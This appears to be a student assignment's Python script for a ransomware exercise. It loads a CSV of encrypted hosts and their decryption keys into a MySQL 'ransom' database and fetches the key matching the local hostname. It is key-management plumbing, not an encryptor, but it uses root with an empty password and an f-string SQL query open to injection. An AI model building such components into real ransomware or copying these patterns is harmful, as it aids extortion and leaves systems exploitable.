import mysql.connector as mysql
from mysql.connector import Error
import pandas as pd
import os

empdata = pd.read_csv('E:\Python Semester 2\Assignment\Ransom\encryptedhosts.csv', index_col=False, delimiter = ',')
empdata.head()

try:
    conn = mysql.connect(host='localhost', user='root', password='')
    if conn.is_connected():
        cursor = conn.cursor()
        cursor.execute("CREATE DATABASE ransom")
except Error as e:
    pass

try:
    conn = mysql.connect(host='localhost', database='ransom', user='root', password='')
    if conn.is_connected():
        cursor = conn.cursor()
        cursor.execute("select database();")
        record = cursor.fetchone()

        cursor.execute('DROP TABLE IF EXISTS ransom_info;')

        cursor.execute("CREATE TABLE ransom_info(time varchar(255),sys_name varchar(255),dec_key varchar(255))")

        for i,row in empdata.iterrows():
            sql = "INSERT INTO ransom.ransom_info VALUES (%s,%s,%s)"
            cursor.execute(sql, tuple(row))
            conn.commit()

        hostname = os.getenv("COMPUTERNAME")

        cursor.execute(f"SELECT dec_key FROM `ransom_info` WHERE sys_name = '{hostname}'")
        result = cursor.fetchone()

    try:
        for keys2 in result:
            keys3 = keys2
    except:
         pass

except Error as e:
            pass

